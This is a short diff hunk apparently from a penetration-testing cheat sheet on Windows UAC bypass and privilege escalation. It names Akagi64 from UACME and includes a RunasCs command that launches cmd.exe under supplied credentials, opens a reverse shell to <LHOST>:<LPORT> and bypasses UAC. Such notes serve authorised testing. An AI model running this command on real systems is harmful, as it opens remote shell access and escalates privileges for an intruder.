@@ -54,7 +54,7 @@ Akagi64.exe, built from UACME, https://github.com/hfiref0x/UACME, which publishe
 - [ ] Older builds: msconfig, then Tools, Command Prompt, Launch
 
 ## With the password
-RunasCs, from :Pb runas:
+RunasCs, from tool install runascs and serve, as in :Pb runas:
 .\RunasCs.exe "<Username>" "<Password>" cmd.exe -r <LHOST>:<LPORT> --bypass-uac
 
 ## Afterwards
